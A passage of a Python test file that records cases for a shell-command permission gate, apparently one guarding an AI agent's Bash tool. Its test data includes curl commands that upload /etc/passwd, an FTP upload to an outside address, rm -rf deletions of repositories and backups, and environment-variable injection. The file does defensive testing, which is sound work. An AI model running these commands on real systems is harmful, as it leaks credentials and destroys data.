    # deletes together with the repository — handoff.
    {"argv": ["rm", "-rf", "vendor"], "cwd": "rm-nested-bundle-inside"},
    # The same, spelled relative to the nested repository — handoff.
    {"argv": ["rm", "-rf", "vendor"], "cwd": "rm-nested-bundle-inside-relative"},
    # A file:// remote to a bare repository beneath the operand (the bare
    # repository carries the commits and has an outside backup of its own)
    # — handoff.
    {"argv": ["rm", "-rf", "vendor"], "cwd": "rm-nested-file-url-inside"},
    # The footprint includes OTHER operands: the bundle lives in a sibling
    # directory the same command deletes — handoff.
    {"argv": ["rm", "-rf", "vendor", "backup"], "cwd": "rm-nested-bundle-sibling"},
    # Control: the bundle outside the footprint — deleting only the
    # repository's operand leaves the evidence standing, run-class.
    {"argv": ["rm", "-rf", "vendor"], "cwd": "rm-nested-bundle-sibling"},
    # Control: the bundle beside the outer repository, outside the
    # footprint — run-class.
    {"argv": ["rm", "-rf", "vendor"], "cwd": "rm-nested-bundle-outside"},
    # Control: a non-local-scheme remote cannot lie inside a filesystem
    # deletion — run-class, the gate's documented asymmetry.
    {"argv": ["rm", "-rf", "vendor"], "cwd": "rm-nested-https"},
]

# v0.5.9 R11 (deep-review round 5): the curl/wget destination-model repair
# matrix. (1) --output-dir composition: curl writes the COMPOSED path
# (<output-dir>/<relative -o value>) through symlinks, so the composed path
# joins the write surface and is resolved and metadata-guarded like every
# write operand — the safe/alias -> .git shape denies via the Git-metadata
# guard and the safe/escape -> sibling-repository shape denies outside the
# workspace, while the direct -o spelling through the same symlink was
# already denied and the in-workspace composed write stays run-class.
# (2) -F comma file lists: curl's form parser reads EVERY comma-separated
# @file, so each piece joins the read floor — a second file outside the
# workspace denies, while an all-in-workspace list stays run-class.
# (3) headers=<file: the headers sub-parameter reads its file through the
# < spelling exactly like the @ spelling, so it joins the read floor; the
# literal headers="..." form reads nothing. (4) Per-URL download
# derivation: -o/-O values pair with the URLs positionally (the k-th
# output option serves the k-th URL; -o - is stdout), and
# -O/--remote-name(-all) applies to the URLs without a paired explicit
# -o, so every derivable destination joins the write surface — a
# sensitive derived name (.env) denies like any write operand and the
# mixed shapes stay run-class. (5) FTP PASV data-connection protection:
# --no-ftp-skip-pasv-ip lets the server's PASV response choose the
# data-connection address, so the invocation resolves ask (network.egress)
# even against a loopback control connection; the default (skip enabled),
# --ftp-skip-pasv-ip, and --disable-epsv alone stay run-class, and wget is
# not gated (--no-passive-ftp switches to active mode, which has no client
# egress). Rows append after R10; ids continue.
PERMISSION_R11_CASES: list[dict[str, Any]] = [
    # (1) --output-dir composition: the composed path is the write
    # candidate, resolved through symlinks and metadata-guarded.
    {
        "argv": [
            "curl",
            "--output-dir",
            "safe",
            "-o",
            "alias/config",
            "http://127.0.0.1/x",
        ],
        "cwd": "curl-output-dir",
    },
    {
        "argv": [
            "curl",
            "--output-dir=safe",
            "-o",
            "alias/config",
            "http://127.0.0.1/x",
        ],
        "cwd": "curl-output-dir",
    },
    {
        "argv": [
            "curl",
            "--output-dir",
            "safe",
            "-o",
            "escape/config",
            "http://127.0.0.1/x",
        ],
        "cwd": "curl-output-dir",
    },
    # Controls: the direct -o spelling through the same symlink (denied by
    # the metadata guard before this round), and the in-workspace shapes.
    {
        "argv": ["curl", "-o", "safe/alias/config", "http://127.0.0.1/x"],
        "cwd": "curl-output-dir",
    },
    {
        "argv": [
            "curl",
            "--output-dir",
            "safe",
            "-o",
            "plain.txt",
            "http://127.0.0.1/x",
        ],
        "cwd": "curl-output-dir",
    },
    {"argv": ["curl", "-o", "out.txt", "http://127.0.0.1/x"]},
    # (2) -F comma file lists: every comma-separated @file is a read
    # operand, so the second file's read is path-inspected.
    {
        "argv": ["curl", "-F", "files=@allowed.txt,/etc/passwd", "http://127.0.0.1/"],
        "cwd": "curl-output-dir",
    },
    {
        "argv": ["curl", "-F", "files=@/etc/passwd", "http://127.0.0.1/"],
        "cwd": "curl-output-dir",
    },
    {
        "argv": ["curl", "-F", "files=@allowed.txt,other.txt", "http://127.0.0.1/"],
        "cwd": "curl-output-dir",
    },
    # (3) headers=<file reads join the read floor exactly like
    # headers=@file; the literal form reads nothing.
    {
        "argv": ["curl", "-F", "name=ok;headers=</etc/passwd", "http://127.0.0.1/"],
        "cwd": "curl-output-dir",
    },
    {
        "argv": ["curl", "-F", "name=ok;headers=@/etc/passwd", "http://127.0.0.1/"],
        "cwd": "curl-output-dir",
    },
    {
        "argv": ["curl", "-F", 'name=ok;headers="X-Test: y"', "http://127.0.0.1/"],
        "cwd": "curl-output-dir",
    },
    {
        "argv": ["curl", "-F", "name=ok;headers=<allowed.txt", "http://127.0.0.1/"],
        "cwd": "curl-output-dir",
    },
    {
        "argv": ["curl", "-F", "story=<allowed.txt", "http://127.0.0.1/"],
        "cwd": "curl-output-dir",
    },
    # (4) Per-URL download derivation: -o/-O pair positionally with the
    # URLs, so every derivable destination joins the write surface.
    {
        "argv": [
            "curl",
            "-O",
            "http://127.0.0.1/.env",
            "-o",
            "x",
            "http://127.0.0.1/second.txt",
        ]
    },
    {
        "argv": [
            "curl",
            "--remote-name-all",
            "-o",
            "-",
            "http://127.0.0.1/first",
            "http://127.0.0.1/.env",
        ]
    },
    # Controls: the mixed shapes with in-workspace destinations.
    {
        "argv": [
            "curl",
            "-O",
            "http://127.0.0.1/first.txt",
            "-o",
            "x",
            "http://127.0.0.1/second.txt",
        ]
    },
    {
        "argv": [
            "curl",
            "--remote-name-all",
            "-o",
            "-",
            "http://127.0.0.1/first",
            "http://127.0.0.1/second.txt",
        ]
    },
    {
        "argv": [
            "curl",
            "-O",
            "http://127.0.0.1/first.txt",
            "http://127.0.0.1/second.txt",
        ]
    },
    {"argv": ["curl", "-O", "-o", "out.txt", "http://127.0.0.1/x"]},
    {"argv": ["curl", "-o", "-", "http://127.0.0.1/x"]},
    # (5) FTP PASV data-connection protection disabled resolves ask-class
    # (network.egress) even against a loopback control connection.
    {
        "argv": [
            "curl",
            "--disable-epsv",
            "--no-ftp-skip-pasv-ip",
            "-T",
            "payload.bin",
            "ftp://127.0.0.1:2121/upload",
        ]
    },
    {
        "argv": [
            "curl",
            "--no-ftp-skip-pasv-ip",
            "-T",
            "payload.bin",
            "ftp://127.0.0.1:2121/upload",
        ]
    },
    {"argv": ["curl", "--no-ftp-skip-pasv-ip", "ftp://127.0.0.1:2121/pub/file.txt"]},
    # Controls: the default (skip enabled), the explicit enabling spelling,
    # and --disable-epsv alone stay run-class; wget is not gated.
    {"argv": ["curl", "-T", "payload.bin", "ftp://127.0.0.1:2121/upload"]},
    {
        "argv": [
            "curl",
            "--disable-epsv",
            "-T",
            "payload.bin",
            "ftp://127.0.0.1:2121/upload",
        ]
    },
    {
        "argv": [
            "curl",
            "--ftp-skip-pasv-ip",
            "-T",
            "payload.bin",
            "ftp://127.0.0.1:2121/upload",
        ]
    },
    {"argv": ["wget", "--max-redirect=0", "ftp://127.0.0.1:2121/pub/file.txt"]},
    {
        "argv": [
            "wget",
            "--max-redirect=0",
            "--no-passive-ftp",
            "ftp://127.0.0.1:2121/pub/file.txt",
        ]
    },
    # A non-loopback destination denies through the destination rule
    # regardless of the PASV flag.
    {
        "argv": [
            "curl",
            "--no-ftp-skip-pasv-ip",
            "-T",
            "payload.bin",
            "ftp://203.0.113.9:2121/upload",
        ]
    },
]

# v0.5.9 R12 (deep-review round 5): four empirically confirmed defects in
# the resolver's guard and git-state recovery analysis. (1) The
# nested-shell guard is token-boundary-aligned: a shell name and a -c-style
# option inside one quoted multi-word argument are DATA the command
# receives, never a nested shell behind an unmodeled wrapper —
# `git commit -m 'fix bash -c handling'`, `git log --grep "bash -c"` and
# `echo 'note: sh -c is tricky'` stay run-class, while a STANDALONE
# shell-name token followed by a -c-style option (`frobnicate sh -c ...`,
# `frobnicate /bin/sh -c ...`) still denies. (2) Recovery-evidence survival
# spans the WHOLE call: the union of every recursive-rm segment's expanded
# operand footprint is the deletion the evidence must survive, so
# `rm -rf vendor; rm -rf backup` denies exactly like the combined
# `rm -rf vendor backup` (also `&&`, `||`, and reversed order), while a
# second segment that deletes nothing the evidence needs keeps the call
# run-class. (3) A write an EARLIER statement of the same call performs
# inside a later recursive-rm segment's eligibility scope — the operand
# footprint, the assessed repository's work tree, or a nested repository's
# work tree — fails the segment closed: `echo x > vendor/nested/nested.txt;
# rm -rf vendor` denies like the same dirtiness present on disk at resolve
# time; a write AFTER the rm, a read-only earlier statement, and the rm
# segment's OWN redirect stay run-class. (4) git percent-decodes file://
# URLs at connect time, so the survival containment decodes the encoded
# path exactly like git: a remote spelled `file://<outer>/%76endor/...`
# names the decoded path INSIDE the operand and denies, while the same
# encoded spelling whose decoded target lies outside the footprint stays
# run-class. Rows append after R11; ids continue.
PERMISSION_R12_CASES: list[dict[str, Any]] = [
    # (1) Quoted multi-word arguments carrying a shell name and -c option
    # are data, never a wrapper: run-class. The raw rows carry the
    # quoting spellings shlex.join cannot express; "argv" stays the
    # token-level view the schema check pins.
    {
        "argv": ["git", "commit", "-m", "fix bash -c handling"],
        "raw": "git commit -m 'fix bash -c handling'",
        "cwd": "rm-clean",
    },
    {
        "argv": ["git", "commit", "-m", "fix bash -c handling"],
        "raw": 'git commit -m "fix bash -c handling"',
        "cwd": "rm-clean",
    },
    {
        "argv": ["git", "log", "--grep", "bash -c"],
        "raw": 'git log --grep "bash -c"',
        "cwd": "rm-clean",
    },
    {
        "argv": ["git", "log", "--grep", "bash -c"],
        "raw": "git log --grep 'bash -c'",
        "cwd": "rm-clean",
    },
    {"argv": ["echo", "note: sh -c is tricky"], "raw": "echo 'note: sh -c is tricky'"},
    # Controls: plain messages and lookalikes stay run-class.
    {
        "argv": ["git", "commit", "-m", "fix bash -C handling"],
        "raw": "git commit -m 'fix bash -C handling'",
        "cwd": "rm-clean",
    },
    {
        "argv": ["git", "commit", "-m", "plain message"],
        "raw": "git commit -m 'plain message'",
        "cwd": "rm-clean",
    },
    {
        "argv": ["git", "log", "--grep", "safe"],
        "raw": "git log --grep safe",
        "cwd": "rm-clean",
    },
    {"argv": ["echo", "hello"], "raw": "echo hello"},
    # True-positive controls: a standalone shell-name token before -c still
    # denies (the existing nested-shell pins keep denying).
    {
        "argv": ["frobnicate", "sh", "-c", "echo hi"],
        "raw": "frobnicate sh -c 'echo hi'",
    },
    {
        "argv": ["frobnicate", "/bin/sh", "-c", "echo hi"],
        "raw": "frobnicate /bin/sh -c 'echo hi'",
    },
    # (2) The union of the segments' deletion footprints covers the
    # recovery evidence: handoff, exactly like the combined command.
    {
        "argv": ["rm", "-rf", "vendor;", "rm", "-rf", "backup"],
        "raw": "rm -rf vendor; rm -rf backup",
        "cwd": "rm-nested-bundle-sibling",
    },
    {
        "argv": ["rm", "-rf", "vendor", "&&", "rm", "-rf", "backup"],
        "raw": "rm -rf vendor && rm -rf backup",
        "cwd": "rm-nested-bundle-sibling",
    },
    {
        "argv": ["rm", "-rf", "vendor", "||", "rm", "-rf", "backup"],
        "raw": "rm -rf vendor || rm -rf backup",
        "cwd": "rm-nested-bundle-sibling",
    },
    {
        "argv": ["rm", "-rf", "backup;", "rm", "-rf", "vendor"],
        "raw": "rm -rf backup; rm -rf vendor",
        "cwd": "rm-nested-bundle-sibling",
    },
    # Controls: a second segment that deletes nothing the evidence needs
    # keeps the call run-class.
    {
        "argv": ["rm", "-rf", "vendor;", "rm", "-rf", "build"],
        "raw": "rm -rf vendor; rm -rf build",
        "cwd": "rm-nested-bundle-sibling",
    },
    {
        "argv": ["rm", "-rf", "vendor;", "rm", "-rf", "missing"],
        "raw": "rm -rf vendor; rm -rf missing",
        "cwd": "rm-nested-bundle-sibling",
    },
    # (3) A write an earlier statement performs inside the later rm
    # segment's eligibility scope fails the segment closed: handoff.
    {
        "argv": ["echo", "x", ">", "vendor/nested/nested.txt;", "rm", "-rf", "vendor"],
        "raw": "echo x > vendor/nested/nested.txt; rm -rf vendor",
        "cwd": "rm-nested-bundle-outside",
    },
    {
        "argv": ["echo", "x", ">", "build/artifact.txt;", "rm", "-rf", "vendor"],
        "raw": "echo x > build/artifact.txt; rm -rf vendor",
        "cwd": "rm-nested-bundle-outside",
    },
    {
        "argv": ["echo", "x", ">", "newfile.txt;", "rm", "-rf", "vendor"],
        "raw": "echo x > newfile.txt; rm -rf vendor",
        "cwd": "rm-nested-bundle-outside",
    },
    {
        "argv": [
            "cp",
            "build/artifact.txt",
            "vendor/nested/nested.txt;",
            "rm",
            "-rf",
            "vendor",
        ],
        "raw": "cp build/artifact.txt vendor/nested/nested.txt; rm -rf vendor",
        "cwd": "rm-nested-bundle-outside",
    },
    # Controls: the write AFTER the rm, a read-only earlier statement, and
    # the rm segment's own redirect stay run-class.
    {
        "argv": ["rm", "-rf", "vendor;", "echo", "x", ">", "after.txt"],
        "raw": "rm -rf vendor; echo x > after.txt",
        "cwd": "rm-nested-bundle-outside",
    },
    {
        "argv": ["git", "status;", "rm", "-rf", "vendor"],
        "raw": "git status; rm -rf vendor",
        "cwd": "rm-nested-bundle-outside",
    },
    {
        "argv": ["rm", "-rf", "vendor", ">", "log.txt"],
        "raw": "rm -rf vendor > log.txt",
        "cwd": "rm-nested-bundle-outside",
    },
    # (4) The percent-encoded file:// remote names the DECODED path: the
    # inside target is destroyed with the repository — handoff.
    {"argv": ["rm", "-rf", "vendor"], "cwd": "rm-nested-pct-inside"},
    # Control: the same encoded spelling whose decoded target lies outside
    # the footprint keeps the evidence standing — run-class.
    {"argv": ["rm", "-rf", "vendor"], "cwd": "rm-nested-pct-outside"},
]


PERMISSION_R13_CASES: list[dict[str, Any]] = [
    # (1) curl --next separates operations (deep-review round 6 R13): the
    # -o/--output-dir composition is per operation, so block 1's composed
    # path — resolved through the safe/alias symlink — is the
    # metadata-guarded write candidate (the invocation-wide composition
    # paired both -o operands with the LAST --output-dir and missed the
    # .git write).
    {
        "argv": [
            "curl",
            "--output-dir",
            "safe",
            "-o",
            "alias/config",
            "http://127.0.0.1/x",
            "--next",
            "--output-dir",
            ".",
            "-o",
            "plain.txt",
            "http://127.0.0.1/y",
        ],
        "cwd": "curl-output-dir",
    },
    # (2) The per-operation URL/output pairing: block 2's -O pairs with
    # block 2's URL, so the .env derivation is collected (the
    # invocation-wide pairing left the third URL unpaired — stdout — and
    # missed the write).
    {
        "argv": [
            "curl",
            "-O",
            "http://127.0.0.1/a",
            "http://127.0.0.1/b",
            "--next",
            "-O",
            "http://127.0.0.1/.env",
        ]
    },
    # (3) --remote-name-all is a local option that resets at --next:
    # block 2's URL has no paired output and no default, so it writes to
    # stdout and no .env derivation joins the write surface (the
    # invocation-wide default over-derived it).
    {
        "argv": [
            "curl",
            "--remote-name-all",
            "http://127.0.0.1/a",
            "--next",
            "http://127.0.0.1/.env",
        ]
    },
    # (4) The -: short spelling separates operations exactly like --next.
    {
        "argv": [
            "curl",
            "-O",
            "http://127.0.0.1/a",
            "http://127.0.0.1/b",
            "-:",
            "-O",
            "http://127.0.0.1/.env",
        ]
    },
    # Control: block 1's -o must not compose with block 2's --output-dir
    # (the real write is ./alias/config, benign) — the invocation-wide
    # composition over-gated it through safe/alias/config.
    {
        "argv": [
            "curl",
            "-o",
            "alias/config",
            "http://127.0.0.1/x",
            "--next",
            "--output-dir",
            "safe",
            "http://127.0.0.1/y",
        ],
        "cwd": "curl-output-dir",
    },
    # Controls: both operations' URLs are loopback destinations with no
    # writes (run-class), a redirect flag in either operation still gates
    # (ask-class), and the per-operation -O pairings derive only benign
    # names (run-class).
    {"argv": ["curl", "http://127.0.0.1/a", "--next", "http://127.0.0.1/b"]},
    {"argv": ["curl", "http://127.0.0.1/a", "--next", "-L", "http://127.0.0.1/b"]},
    {
        "argv": [
            "curl",
            "-O",
            "http://127.0.0.1/first.txt",
            "--next",
            "-O",
            "http://127.0.0.1/second.txt",
        ]
    },
    # (5) The modeled clients' config-discovery env vars are dangerous
    # environment assignments: a command-prefix or env-wrapper spelling
    # is policy-denied (aggregated with the classifier's own ask on the
    # invocation's environment), and the classifier's config-key gate
    # covers the sudo -u wrapper's NAME=value operand, which the
    # assignment policy does not reach — ask-class (network.egress).
    {"argv": ["CURL_HOME=x", "curl", "http://127.0.0.1/x"]},
    {"argv": ["env", "CURL_HOME=x", "curl", "http://127.0.0.1/x"]},
    {"argv": ["WGETRC=x", "wget", "--max-redirect=0", "http://127.0.0.1/x"]},
    {"argv": ["env", "WGETRC=x", "wget", "--max-redirect=0", "http://127.0.0.1/x"]},
    {"argv": ["sudo", "-u", "nobody", "CURL_HOME=x", "curl", "http://127.0.0.1/x"]},
    # Controls: a benign env-wrapper assignment keeps the loopback fetch
    # run-class, and the dangerous-assignment set is client-agnostic (a
    # CURL_HOME prefix on wget denies on the policy ground alone).
    {"argv": ["env", "FOO=bar", "curl", "http://127.0.0.1/x"]},
    {"argv": ["CURL_HOME=x", "wget", "--max-redirect=0", "http://127.0.0.1/x"]},
    # (6) env's attached option spellings are option operands, not
    # assignments: --unset=BAR and --chdir=. match their separate
    # counterparts (both admitted — the invocation-wide loop used to
    # policy-deny the attached spellings as non-uppercase assignments).
    # The assignment checks still fire for genuine assignment operands.
    {"argv": ["env", "FOO=bar", "--unset=BAR", "curl", "http://127.0.0.1/x"]},
    {"argv": ["env", "FOO=bar", "--unset", "BAR", "curl", "http://127.0.0.1/x"]},
    {"argv": ["env", "FOO=bar", "--chdir=.", "curl", "http://127.0.0.1/x"]},
    {"argv": ["env", "FOO=bar", "--chdir", ".", "curl", "http://127.0.0.1/x"]},
    {"argv": ["env", "FOO=bar", "1X=1", "curl", "http://127.0.0.1/x"]},
    {"argv": ["env", "HOME=x", "curl", "http://127.0.0.1/x"]},
    # (7) wget's -n-prefix composites are atomic short options: -np is
    # --no-parent, so it does not trip the -p/--page-requisites gate (the
    # letter-by-letter cluster scan used to false-trip it), while a
    # genuine -p, a leading p in a cluster, and -r still gate, and the
    # other documented composites stay run-class.
    {"argv": ["wget", "--max-redirect=0", "-np", "http://127.0.0.1/x"]},
    {"argv": ["wget", "--max-redirect=0", "-np", "-r", "http://127.0.0.1/x"]},
    {"argv": ["wget", "--max-redirect=0", "-p", "http://127.0.0.1/x"]},
    {"argv": ["wget", "--max-redirect=0", "-pn", "http://127.0.0.1/x"]},
    {"argv": ["wget", "--max-redirect=0", "-nd", "http://127.0.0.1/x"]},
    {"argv": ["wget", "--max-redirect=0", "-nc", "http://127.0.0.1/x"]},
    {"argv": ["wget", "--max-redirect=0", "-nv", "http://127.0.0.1/x"]},
    {"argv": ["wget", "--max-redirect=0", "-nH", "http://127.0.0.1/x"]},
    # (8) The IPv4-mapped loopback spellings (dotted and hex) are
    # recognized loopback destinations for both modeled clients; a mapped
    # non-loopback address resolves ask-class like any other non-loopback
    # destination.
    {"argv": ["curl", "http://[::ffff:127.0.0.1]/x"]},
    {"argv": ["curl", "http://[::ffff:7f00:1]/x"]},
    {"argv": ["curl", "http://[::ffff:8.8.8.8]/x"]},
    {"argv": ["wget", "--max-redirect=0", "http://[::ffff:127.0.0.1]/x"]},
]


PERMISSION_R14_CASES: list[dict[str, Any]] = (
    [
        {
            "argv": [],
            "raw": f"rm -rf vendor; {mutation}",
            "cwd": "rm-nested-bundle-sibling",
        }
        for mutation in (
            "rm backup/nested.bundle",
            "rm -- backup/nested.bundle",
            "rm backup/*.bundle",
            "mv backup/nested.bundle elsewhere/",
            "mv backup elsewhere/",
            "mv -t elsewhere backup/nested.bundle",
            "mv --target-directory=elsewhere backup/*.bundle",
            "mv backup/nested.bundle elsewhere/ --suffix=.old",
            "printf '' > backup/nested.bundle",
            "cp build/artifact.txt backup/nested.bundle",
            "mv build/artifact.txt backup/nested.bundle",
            "install build/artifact.txt backup/nested.bundle",
            "dd if=build/artifact.txt of=backup/nested.bundle",
            "objcopy build/artifact.txt backup/nested.bundle",
            "sed -n 'w backup/nested.bundle' build/artifact.txt",
            "zip backup/nested.bundle build/artifact.txt",
            "7z a backup/nested.bundle build/artifact.txt",
            "unzip archive.zip -d backup",
            "patch -d backup -i changes.diff",
            "git apply --directory=backup changes.diff",
        )
    ]
    + [
        {"argv": [], "raw": command, "cwd": "rm-nested-bundle-sibling"}
        for command in (
            "rm backup/nested.bundle; rm -rf vendor",
            "rm -rf vendor && rm backup/nested.bundle",
            "rm -rf vendor || mv backup/nested.bundle elsewhere/",
            "rm -rf vendor\nrm backup/nested.bundle",
            "rm -rf vendor; command rm backup/nested.bundle",
            "rm -rf vendor; bash -c 'mv backup/nested.bundle elsewhere/'",
            "rm -rf vendor > backup/nested.bundle",
            "rm -rf vendor; rm -rf build",
            "rm -rf vendor; echo x > after.txt",
            "rm -rf vendor",
        )
    ]
    + [
        {
            "argv": [],
            "raw": f"rm -rf vendor; {mutation}",
            "cwd": "rm-nested-bundle-outside",
        }
        for mutation in (
            "rm backup/nested.bundle",
            "mv backup/nested.bundle elsewhere/",
            "printf '' > backup/nested.bundle",
        )
    ]
    + [
        {"argv": ["rm", "-rf", "vendor"], "cwd": "rm-nested-alias-inside"},
        {"argv": ["rm", "-rf", "vendor"], "cwd": "rm-nested-file-alias-inside"},
        {"argv": ["rm", "-rf", "vendor"], "cwd": "rm-nested-plain-inside"},
        {"argv": ["rm", "-rf", "vendor"], "cwd": "rm-nested-bundle-outside"},
        {"argv": ["command", "unset", "PATH"]},
        {"argv": ["/usr/bin/unset", "PATH"]},
        {"argv": [], "raw": "unset PATH"},
        {"argv": [], "raw": "unset FOO"},
        {"argv": [], "raw": "unset -v GIT_PAGER"},
    ]
)


def _tokenize_paths(value: Any, root: Path) -> Any:
    if isinstance(value, str):
        return value.replace(str(root), FIXTURES_TOKEN)
    if isinstance(value, dict):
        return {str(key): _tokenize_paths(item, root) for key, item in value.items()}
    if isinstance(value, list):
        return [_tokenize_paths(item, root) for item in value]
    return value


def observe_permission(entry: dict[str, Any], root: Path) -> dict[str, Any]:
    """Resolved permission classes for the sg and shipped-denylist pins."""
    if entry.get("raw") is not None:
        command = str(entry["raw"])
    else:
        command = shlex.join([str(token) for token in entry["argv"]])
    # P2-c rows name the fixture directory the call resolves in; the rest
    # resolve in the fixture root itself.
    cwd = root / str(entry["cwd"]) if entry.get("cwd") else root
    tool = Bash(config_getter=lambda: BashToolConfig(), state=BaseToolState(), cwd=cwd)
    context = tool.resolve_permission(BashArgs(command=command))
    if context is None:
        return {"context": None}
    dumped = json.loads(context.model_dump_json())
    return {
        "context": {
            "permission": dumped["permission"],
            "denial_kind": dumped["denial_kind"],
            "reason": _tokenize_paths(dumped["reason"], root),
            "proposal": _tokenize_paths(dumped["dangerous_command_proposal"], root),
        }
    }


OBSERVERS: dict[str, Callable[[dict[str, Any], Path], dict[str, Any]]] = {
    "policy": observe_policy,
    "paths": observe_paths,
    "git_pure": observe_git_pure,
    "executor": observe_executor,
    "executor_aux": observe_executor_aux,
    "argv_helpers": observe_argv_helpers,
    "registry": observe_registry,
    "git_inspection": observe_git_inspection,
    "push_risk": observe_push_risk,
    "divergence": observe_divergence,
    "permission": observe_permission,
}

FAMILY_ORDER = tuple(OBSERVERS)


def observe_entry(entry: dict[str, Any], root: Path) -> dict[str, Any]:
    """Run the recipe one corpus entry was recorded with."""
    observer = OBSERVERS.get(str(entry["family"]))
    assert observer is not None, f"unknown corpus family: {entry['family']}"
    return observer(entry, root)


# ---------------------------------------------------------------------------
# Corpus assembly
# ---------------------------------------------------------------------------


def build_family_entries(family: str, root: Path) -> list[dict[str, Any]]:
    """Build every corpus entry of one family, in recorded order."""
    entries: list[dict[str, Any]] = []

    def add(inputs: dict[str, Any], expect: dict[str, Any]) -> None:
        entries.append({
            "id": f"{family}:{len(entries) + 1:04d}",
            "family": family,
            **inputs,
            "expect": expect,
        })

    if family == "policy":
        for argv in ALL_POLICY_ARGV:
            add({"argv": argv}, observe_policy({"argv": argv}, root))
    elif family == "paths":
        for argv in ALL_POLICY_ARGV:
            add({"argv": argv}, observe_paths({"argv": argv}, root))
    elif family == "git_pure":
        for argv in GIT_PURE_ARGV:
            add({"argv": argv}, observe_git_pure({"argv": argv}, root))
    elif family == "executor":
        for argv in EXECUTOR_ARGV:
            for admission in (False, True):
                entry = {"argv": argv, "admission": admission}
                add(entry, observe_executor(entry, root))
    elif family == "executor_aux":
        for argv in EXECUTOR_ARGV:
            add({"argv": argv}, observe_executor_aux({"argv": argv}, root))
    elif family == "argv_helpers":
        for case in ARGV_HELPER_CASES:
            add(case, observe_argv_helpers(case, root))
    elif family == "registry":
        add({}, observe_registry({}, root))
    elif family == "git_inspection":
        for case in GIT_INSPECTION_CASES:
            add(case, observe_git_inspection(case, root))
    elif family == "push_risk":
        for case in PUSH_RISK_CASES:
            add(case, observe_push_risk(case, root))
    elif family == "divergence":
        for argv in DIVERGENCE_ARGV:
            add({"argv": argv}, observe_divergence({"argv": argv}, root))
    elif family == "permission":
        for argv in PERMISSION_ARGV:
            add({"argv": argv}, observe_permission({"argv": argv}, root))
        for case in PERMISSION_CWD_CASES:
            add(case, observe_permission(case, root))
        for argv in PERMISSION_P2D_ARGV:
            add({"argv": argv}, observe_permission({"argv": argv}, root))
        for case in PERMISSION_P3A_CASES:
            add(case, observe_permission(case, root))
        for case in PERMISSION_P3B_CASES:
            add(case, observe_permission(case, root))
        for case in PERMISSION_P3B2_CASES:
            add(case, observe_permission(case, root))
        for case in PERMISSION_P3C_CASES:
            add(case, observe_permission(case, root))
        for case in PERMISSION_R1_CASES:
            add(case, observe_permission(case, root))
        for case in PERMISSION_R2_CASES:
            add(case, observe_permission(case, root))
        for case in PERMISSION_R3_CASES:
            add(case, observe_permission(case, root))
        for case in PERMISSION_R4_CASES:
            add(case, observe_permission(case, root))
        for case in PERMISSION_R5_CASES:
            add(case, observe_permission(case, root))
        for case in PERMISSION_R6_CASES:
            add(case, observe_permission(case, root))
        for case in PERMISSION_R7_CASES:
            add(case, observe_permission(case, root))
        for case in PERMISSION_R8_CASES:
            add(case, observe_permission(case, root))
        for case in PERMISSION_R9_CASES:
            add(case, observe_permission(case, root))
        for case in PERMISSION_R10_CASES:
            add(case, observe_permission(case, root))
        for case in PERMISSION_R11_CASES:
            add(case, observe_permission(case, root))
        for case in PERMISSION_R12_CASES:
            add(case, observe_permission(case, root))
        for case in PERMISSION_R13_CASES:
            add(case, observe_permission(case, root))
        for case in PERMISSION_R14_CASES:
            add(case, observe_permission(case, root))
    else:
        raise AssertionError(f"unknown corpus family: {family}")
    return entries


def build_entries(root: Path) -> list[dict[str, Any]]:
    """Build the whole corpus in its recorded order."""
    return [
        entry for family in FAMILY_ORDER for entry in build_family_entries(family, root)
    ]


def serialize_entries(entries: list[dict[str, Any]]) -> str:
    """Serialize entries as the canonical JSONL text of the corpus."""
    return "".join(json.dumps(entry, sort_keys=True) + "\n" for entry in entries)


def load_corpus() -> list[dict[str, Any]]:
    """Load the committed corpus entries (empty when not yet recorded)."""
    if not CORPUS_PATH.is_file():
        return []
    entries: list[dict[str, Any]] = []
    for line in CORPUS_PATH.read_text(encoding="utf-8").splitlines():
        if line.strip():
            entries.append(json.loads(line))
    return entries


def _difference(
    entry_id: str, observed: Any, expected: Any, path: str = "expect"
) -> str:
    """Locate the first difference between an observation and its record."""
    if isinstance(expected, dict) and isinstance(observed, dict):
        for key in sorted(set(expected) | set(observed), key=str):
            if key not in observed:
                return f"{entry_id}: missing key {path}.{key}"
            if key not in expected:
                return f"{entry_id}: unexpected key {path}.{key}"
            difference = _difference(
                entry_id, observed[key], expected[key], f"{path}.{key}"
            )
            if difference:
                return difference
        return ""
    if observed != expected:
        return f"{entry_id}: {path}: observed {observed!r} != recorded {expected!r}"
    return ""


# ---------------------------------------------------------------------------
# Tests
# ---------------------------------------------------------------------------


def test_corpus_entry_schema() -> None:
    """The committed corpus is well-formed and covers every family."""
    entries = load_corpus()
    assert entries, (
        "corpus.jsonl is missing or empty; regenerate with: "
        "uv run python tests/tools/test_shell_policy_corpus.py --record"
    )
    ids = [str(entry["id"]) for entry in entries]
    assert len(ids) == len(set(ids)), "duplicate corpus entry ids"
    families: set[str] = set()
    for entry in entries:
        family = str(entry["family"])
        families.add(family)
        assert family in OBSERVERS, f"unknown family in {entry['id']}"
        assert entry["id"].startswith(f"{family}:"), entry["id"]
        assert isinstance(entry["expect"], dict) and entry["expect"], entry["id"]
        if family in {
            "policy",
            "paths",
            "git_pure",
            "executor_aux",
            "divergence",
            "permission",
        }:
            assert isinstance(entry["argv"], list), entry["id"]
        if family == "executor":
            assert isinstance(entry["argv"], list), entry["id"]
            assert isinstance(entry["admission"], bool), entry["id"]
    assert families == set(FAMILY_ORDER), (
        f"corpus families {sorted(families)} != expected {sorted(FAMILY_ORDER)}"
    )


@pytest.mark.parametrize("entry", load_corpus(), ids=lambda entry: entry["id"])
def test_corpus_replay(entry: dict[str, Any], fixtures_root: Path) -> None:
    """Replay one corpus entry: the module must reproduce the record exactly."""
    observed = observe_entry(entry, fixtures_root)
    difference = _difference(str(entry["id"]), observed, entry["expect"])
    assert not difference, difference


@pytest.mark.parametrize("family", FAMILY_ORDER)
def test_corpus_recorder_round_trip(family: str, fixtures_root: Path) -> None:
    """The recorder reproduces the committed corpus byte-identically."""
    regenerated = serialize_entries(build_family_entries(family, fixtures_root))
    committed = "".join(
        line + "\n"
        for line in CORPUS_PATH.read_text(encoding="utf-8").splitlines()
        if line and json.loads(line)["family"] == family
    )
    assert regenerated == committed, (
        f"corpus.jsonl is stale for family {family!r}; regenerate with: "
        "uv run python tests/tools/test_shell_policy_corpus.py --record"
    )


# The two table-driven denial texts the policy layer emits for unmodeled
# builtins and unrecognized subcommands; its unmodeled spelling carries a
# trailing enforcement suffix the classifier's label lacks.
_POLICY_TABLE_DENIAL_PREFIXES = (
    "unmodeled git builtin ",
    "unrecognized git subcommand ",
)


